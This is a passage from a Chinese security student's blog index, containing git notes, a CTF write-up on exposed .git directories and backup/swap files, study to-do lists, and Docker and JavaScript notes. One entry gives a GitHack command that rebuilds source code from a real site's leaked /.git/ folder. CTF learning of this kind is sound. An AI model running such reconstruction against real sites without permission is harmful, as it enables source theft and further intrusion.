class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装git</span><br>$ yum install git<br><br><span class="hljs-comment">#配置基本信息</span><br>$ git config --global user.name <span class="hljs-string">"icefeng199"</span><br>$ git config --global user.email <span class="hljs-string">"admin@icefeng.cc"</span><br>$ git config --list<br><br><span class="hljs-comment">#创建版本库 又名仓库 英文名叫：repository</span><br>$ git init <span class="hljs-comment">#目录变repository,当前目录多了一个.git 要ls -a</span><br><br><br><span class="hljs-comment">#文件添加到版本库 </span><br><span class="hljs-comment">#PS:所有的版本控制系统 只能追踪文本文件的具体变化 二进制文件只能追踪大小，无法追踪具体变化</span><br>$ git add fisrt.txt<br>$ git commit -m <span class="hljs-string">"wrote a fisrt get file"</span><br><span class="hljs-comment">#修改fisrt.txt文件</span><br><br>$ git status <span class="hljs-comment">#查看当前仓库的状态 </span><br>$ git diff <span class="hljs-comment">#查看当前修改了什么内容</span><br>$ git <span class="hljs-built_in">log</span> <span class="hljs-comment">#显示最近到最远提交的日志 --pretty=oneline 单行查看</span><br><br>$ git reset --hard HEAD^ <span class="hljs-comment">#退回上一个版本 HEAD是指当前版本</span><br>$ git reset --hard commit_id <span class="hljs-comment">#可以在任意版本之间穿梭</span><br></code></pre></td></tr></table></figure><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/nu1lbook/git_learn_1.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x02-Git的文件夹分析"><a class="header-anchor" href="#0x02-Git的文件夹分析"></a>0x02.Git的文件夹分析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">├── HEAD   #映射到ref引用，能够找到下一次commit的前一次哈希值<br>├── config # 存放git的一些信息<br>├── description #仓库的描述信息，主要给gitweb等git托管系统使用<br>├── hooks #Shell脚本<br>├── index #暂存区（stage），是一个二进制文件<br>├── info #git仓库的一些信息<br>│   └── exclude<br>├── objects # 存放所有git对象的地方<br>│   ├── 0c<br>│   │   └── 14454dd8d472ef27843ac8c86bdba161c27a03<br>│   ├── info<br>│   └── pack<br>└── refs<br>    ├── heads #所有本地分支文件<br>    └── tags #文件夹是使用git stash命令时，会将生成的git对象的哈希值存储到stash文件里<br></code></pre></td></tr></table></figure><h3 id="0x3-Git泄露获取"><a class="header-anchor" href="#0x3-Git泄露获取"></a>0x3 Git泄露获取</h3><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/nu1lbook/git_learn_2.png" srcset="/img/loading.gif" alt=""></p><h4 id="1-GitHack的使用"><a class="header-anchor" href="#1-GitHack的使用"></a>1.GitHack的使用</h4><blockquote><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。</p><p>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。</p></blockquote><ul><li>用法</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 GitHack.py http://www.openssl.org/.git/<br></code></pre></td></tr></table></figure><ul><li>原理<ul><li>解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )</li><li>去.git/objects/ 文件夹下下载对应的文件</li><li>zlib解压文件，按原始的目录结构写入源代码</li></ul></li></ul><h4 id="2-Githack-一把梭"><a class="header-anchor" href="#2-Githack-一把梭"></a>2.Githack 一把梭</h4><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/nu1lbook/git_learn_4.png" srcset="/img/loading.gif" alt=""></p><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/nu1lbook/git_learn_3.png" srcset="/img/loading.gif" alt=""></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">git <span class="hljs-built_in">log</span> 查看之前的提交，并且回到上个版本看有无<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/nu1lbook/git_learn_2.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>每日Todo列表(2021/01/12)</title>
    <link href="/2021/01/12/Todo_1_12/"/>
    <url>/2021/01/12/Todo_1_12/</url>
    
    <content type="html"><![CDATA[<h3 id="0-上午"><a class="header-anchor" href="#0-上午"></a>0.上午</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 学习Git的目录以及Git生成和提交整个流程</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 复习Dirsearch的使用</li><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 学习并且弥补SQL注入漏洞方面的方法和概念</li><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 学习并且复习JavaScript的语法</li></ul><a id="more"></a><h3 id="1-下午"><a class="header-anchor" href="#1-下午"></a>1.下午</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 完成SQLi注入靶场和书中的CTF试题（NI1L）</li><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 继续学习Python的进阶相关的用法（小甲鱼）</li><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 学习PHP并且做一些后端的小东西</li></ul><h3 id="2-晚上"><a class="header-anchor" href="#2-晚上"></a>2.晚上</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 适当的娱乐</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 开始阅读一些书</li></ul><h3 id="反思"><a class="header-anchor" href="#反思"></a>反思</h3><blockquote><p>QAQ，计划崩坏的一天，很多事情无意间就打乱了节奏</p><p>也是蛮有意义的一天，听了许多故事，从中理解到一些思想上的东西</p><p>适当减少一些计划，去高质量的完成</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Todo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NU1l_CTF_信息收集_常见的搜集</title>
    <link href="/2021/01/11/nu1l-book-dirsearch/"/>
    <url>/2021/01/11/nu1l-book-dirsearch/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-目录扫描工具dirsearch的使用"><a class="header-anchor" href="#0x00-目录扫描工具dirsearch的使用"></a>0x00 目录扫描工具dirsearch的使用</h3><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/nu1lbook/nu1l_information_4.png" srcset="/img/loading.gif" alt=""></p><a id="more"></a><h3 id="0x01-泄露信息"><a class="header-anchor" href="#0x01-泄露信息"></a>0x01 泄露信息</h3><ol><li><a href="http://192.168.186.131:90/robots.txt%E6%96%87%E4%BB%B6%E6%89%BE%E5%88%B0flag_1%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">http://192.168.186.131:90/robots.txt文件找到flag_1文件</a></li></ol><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/nu1lbook/nu1l_information_1.png" srcset="/img/loading.gif" alt=""></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">fla<span class="hljs-name">g1</span>:<span class="hljs-symbol">n1</span>book&#123;i<span class="hljs-symbol">nfo_1</span><br></code></pre></td></tr></table></figure><ol start="2"><li>目录扫描找到gedit临时备份（gedit会在保存文件后自动生成 文件名+~）</li></ol><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/nu1lbook/nu1l_information_2.png" srcset="/img/loading.gif" alt=""></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">flag2:</span>s_v3ry_im<br></code></pre></td></tr></table></figure><ol start="3"><li>.index.php.swp文件是ssh登陆时候未保存，直接退出，vim将当前内容dump到这个文件</li></ol><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/nu1lbook/nu1l_information_3.png" srcset="/img/loading.gif" alt=""></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">flag3:</span>p0rtant_hack&#125;<br></code></pre></td></tr></table></figure><p><strong>----------------------------------------综上-------------------------------------------</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">flag:n1book&#123;info_1s_v3ry_imp0rtant_hack&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web_tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>每日Todo列表(2021/01/11)</title>
    <link href="/2021/01/11/Todo_1_11/"/>
    <url>/2021/01/11/Todo_1_11/</url>
    
    <content type="html"><![CDATA[<h3 id="0-早上"><a class="header-anchor" href="#0-早上"></a>0.早上</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 熟练掌握信息泄露不会读的单词；</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 复习昨天docker/docker compose 的使用和侧重点</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 复习Linux常用指令完成Linux一些测试题</li><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 复习JavaScript的语法</li></ul><a id="more"></a><h3 id="1-上午"><a class="header-anchor" href="#1-上午"></a>1.上午</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 做两道信息收集的CTF练习题并且思考原理和方法（NI1L）</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 学习Python的算法和列表相关并且做题（小甲鱼）</li><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 今天你专注了吗 ¿</li></ul><h3 id="2-中午"><a class="header-anchor" href="#2-中午"></a>2.中午</h3><blockquote><p>做Todo_List的第一天</p><p>检查上午完成情况，进行调整和改进</p></blockquote><p>下午晚上摸鱼了🙉</p><h3 id="3-反思（1-12）"><a class="header-anchor" href="#3-反思（1-12）"></a>3.反思（1.12）</h3><blockquote><p>1.有效学习时间太少，注意力不集中，效率很低</p><p>2.规划合理的娱乐时间，不然总是想着去玩</p><p>3.利用自己能掌控的时间去尽全力去完成，因为生活不是规划，总会有意想不到的事情发生</p><p>4.从根本的娱乐思想去做改变，去尝试阅读</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Todo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker是什么？</title>
    <link href="/2021/01/07/Docker_1/"/>
    <url>/2021/01/07/Docker_1/</url>
    
    <content type="html"><![CDATA[<h2 id="Docker是什么？"><a class="header-anchor" href="#Docker是什么？"></a>Docker是什么？</h2><ul><li>Docker 是一个工具，帮我们更方便的创建，运行和部署软件。</li><li>Docker 可以把软件和其依赖打包成一个单独的库文件，更利于移植可运行的软件</li></ul><a id="more"></a><h3 id="Docker优点"><a class="header-anchor" href="#Docker优点"></a>Docker优点</h3><ol><li>占用资源少</li><li>资源利用率高</li><li>运行速度快（与VM相比只是当前操作系统中的一个进程）</li></ol><h3 id="Docker的用途"><a class="header-anchor" href="#Docker的用途"></a>Docker的用途</h3><ol><li>提供一次性的环境</li><li>提供弹性的云服务</li><li>组建微服务框架</li></ol><h3 id="Docker-image是什么？"><a class="header-anchor" href="#Docker-image是什么？"></a>Docker image是什么？</h3><ul><li><p>Docker image是Docker Container 的设计蓝图</p></li><li><p>Docker image包含Dockerfile、依赖和程序的代码</p></li><li><p>文件Dockerfile中包含一系列的指令用来创建Docker image</p><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/DOCKER/docker_1.png" srcset="/img/loading.gif" alt=""></p></li><li><p>Docker image + docker run image_name = Container</p></li></ul><h3 id="Docker-pull-run"><a class="header-anchor" href="#Docker-pull-run"></a>Docker pull/run</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker image pull hello-world<br>docker image rm hello-world<br>docker images/image ls<br>docker container run hello-world<br>docker container rm hello-world<br><br>docker container run -it ubuntu base <span class="hljs-comment">#运行ubuntu的base</span><br>docker container ls <span class="hljs-comment">#查看运行的container</span><br>docker container <span class="hljs-built_in">kill</span> container_ID <span class="hljs-comment">#终止进程</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web_tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JSJSJSJSJSJSJS</title>
    <link href="/2020/12/25/JavaScript_1/"/>
    <url>/2020/12/25/JavaScript_1/</url>
    
    <content type="html"><![CDATA[<h3 id="1-Javascript新坑"><a class="header-anchor" href="#1-Javascript新坑"></a>1.Javascript新坑</h3><ul><li><p>历史</p><blockquote><p>名字：Mocha–&gt;LiveScript–&gt;JavaScript</p></blockquote></li><li><p>前端三大件</p><blockquote><p>HTML：网页的骨架</p><p>CSS：网页的衣服</p><p>JavaScript：网页的灵魂</p></blockquote><a id="more"></a></li><li><p>20/80原则</p><blockquote><p>数据结构，运算符</p><p>条件判断循环</p><p>函数，面向对象</p><p>NodeJS）</p><p>JSON,AJAX,RESTful API</p><p>全栈爬虫</p></blockquote></li></ul>]]></content>
    
    
    <categories>
      
      <category>Code</category>
      
      <category>JavaScript</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>简单的insanity</title>
    <link href="/2020/02/16/ctf_1/"/>
    <url>/2020/02/16/ctf_1/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">(　・ˍ・)猜密码，查看文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="644c1df358a18c19c1d1b06af7cd07640fecd48c342fe1f3f32f6472d6085a9e">7cfe643cec1c01c1eb46e7e2f79bf07aa62ff8ac78e164d014e12462fda357d51cc26661a6062d99f28a29ab2def08b3fe5f27e2bbc672383ce6beb9078502dee52d30603d58f2553576d1764701740435496d6a6b692e4f30162692adadd2cffc14fd8e10787a1717a63b3782319e03a91e4d108839e27fef88e2fb25d6e0b4b27667bd8cd766624ae1baf18260a641615346b25fcd5dcf8b9dfe3984309f968c4056f8523141b0c5aeeb8cc7e75d9530bdc8ca8c1456c9133cebc1c835fd5d8803345ed4e836c9263b8d7dc46d4bff7d3d6181a03e8b42320de32d648248fec664f4038c3f99aa44105e64e2cb6223e72616ecf8875ff6cfb5279d3926670ebd5cac7663260f2aa6a84106a832a6f6b594c07452618e95d265d18cacdfe994e114f6c734731989a06733c3482e734fe4f956421dd4f2e30cfaa11abf4b128e47d933d9c5d1798a3f9d708238c4d5bd02adf75e4f66e5c4b7cc7a71df0c6dec12ab73f277cebca0e4f42d483911b611e2101dfeacb126c54d1aeb1935aad7fb8d720e8b651a28223418224bd9cc38551ce4eb949be8438fdbddb930c6c38ec8d9e25fa3d42f024ca72f5ea8520f0bf86a8ebb16a88f2e7b2ea4b6c4490ca8c9288a5bfae07081d2c266c0aa20e97831e63c05a8173cbfd75e10b9a2749979c0a79f5e51a4640c6f0cbb62477bff32baaf474bb25f95a4c771330fb3a753dee776752d7042e26217f02339312b27d37245678b46c8f4ec10fa77c0a79457ce5223e077aaf5c92d516725faeef65c322dc0211012e9cdc688363a25b11043ddb6b72916fb2cc36807261b870d5a7fde05762e28dbe8cbc40798646f8489089d865f7fe02277c5de78bc61e22cea51cfa8c292bdd0019895b44d8807e4aff1bb39e5ef9d344358cac725c2b4cd0a2f30c60977bc525c33b47746743b47028d3a98eb00abf2aef0a9de54c1bc4d9e0d919b3142d09ace4184fd8cc17f756c34b705c8dd9cd28a00982b54e207454d807208f7cfcdb057fa2858316692630a939399</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>RE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
